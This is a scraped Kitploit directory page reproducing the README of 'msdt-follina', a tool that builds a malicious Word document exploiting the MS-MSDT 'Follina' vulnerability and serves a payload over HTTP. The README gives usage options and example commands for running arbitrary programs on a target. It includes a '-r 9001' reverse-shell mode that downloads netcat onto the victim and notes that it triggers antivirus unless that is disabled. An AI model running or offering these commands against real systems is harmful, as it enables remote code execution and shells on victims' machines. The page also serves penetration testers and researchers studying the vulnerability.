@@ -1,0 +1,132 @@
+---
+title: msdt-follina
+url: https://kitploit.com/en/tools/github/johnhammond/msdt-follina
+source: Kitploit
+date: 2026-08-28
+fetch_date: 2026-08-29T08:31:25.519733
+---
+
+# msdt-follina
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.
+
+·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit
+
+Tool Directory
+
+## Categories
+
+[View all categories](/en/categories)
+
+Loading categories
+
+msdt-follina — Generates a malicious Microsoft Word document exploiting the MS-MSDT 'Follina' vulnerability to execute arbitrary commands or stage payloads via an HTTP server. | Kitploit
+
+[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/johnhammond/msdt-follina
+
+![](https://assets.kitploit.com/production/public/tools/53186/b167c5fd1086650cb24b302e42d648c93d85425d50eded142e53603b8ed1f608-display-v1.webp)
+
+[Exploitation](/en/categories/exploitation)[Web Application Exploitation](/en/categories/web-application-exploitation)[Phishing](/en/categories/phishing)[Command and Control](/en/categories/command-and-control)[Payload Development](/en/categories/payload-development)
+
+![GitHub](/providers/github.png)johnhammond/msdt-follina
+
+# msdt-follina
+
+Generates a malicious Microsoft Word document exploiting the MS-MSDT 'Follina' vulnerability to execute arbitrary commands or stage payloads via an HTTP server.
+
+[View Repository](https://github.com/johnhammond/msdt-follina)
+
+1.6k370414 years ago![Reviewed by Kitploit](/_next/image?url=%2Fbadges%2Fkitploit_badge_reviewed_full.png&w=48&q=75)
+
+### Most Popular
+
+[View all →](/en/tools)
+
+Discover the most used tools by our community.
+
+Last 7 DaysLast 30 Days
+
+Explore all tools
+
+Browse our collection of tools
+
+[View all tools →](/en/tools)
+
+Share
+
+# MS-MSDT "Follina" Attack Vector
+
+> John Hammond | May 30, 2022
+
+---
+
+Create a "Follina" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.
+
+![Screenshot](https://assets.kitploit.com/production/public/readmes/53186/b167c5fd1086650cb24b302e42d648c93d85425d50eded142e53603b8ed1f608/94b1e395d93273f46fe1d6b2031aa56dc0b07982b6a1461da1186bafd0d12d7c-display-v1.webp)
+
+# Usage
+
+root@kitploit:~
+
+```
+usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]
+
+options:
+  -h, --help            show this help message and exit
+  --command COMMAND, -c COMMAND
+                        command to run on the target (default: calc)
+  --output OUTPUT, -o OUTPUT
+                        output maldoc file (default: ./follina.doc)
+  --interface INTERFACE, -i INTERFACE
+                        network interface or IP address to host the HTTP server (default: eth0)
+  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
+```
+
+# Examples
+
+Pop `calc.exe`:
+
+root@kitploit:~
+
+```
+$ python3 follina.py
+[+] copied staging doc /tmp/9mcvbrwo
+[+] created maldoc ./follina.doc
+[+] serving html payload on :8000
+```
+
+Pop `notepad.exe`:
+
+root@kitploit:~
+
+```
+$ python3 follina.py -c "notepad"
+```
+
+Get a reverse shell on port 9001. **Note, this downloads a netcat binary *onto the victim* and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**
+
+root@kitploit:~
+
+```
+$ python3 follina.py -r 9001
+```
+
+![Reverse Shell](https://assets.kitploit.com/production/public/readmes/53186/c77a2919d48682a30537747a33bb25c360d2eca50d0241782bc3dde9f30cedc7/3b21fbd774380a11b49e316c145c3214937ceb4e608ab4618fb4dda64491fdc0-display-v1.webp)
+
+[Download Tool](https://github.com/johnhammond/msdt-follina)
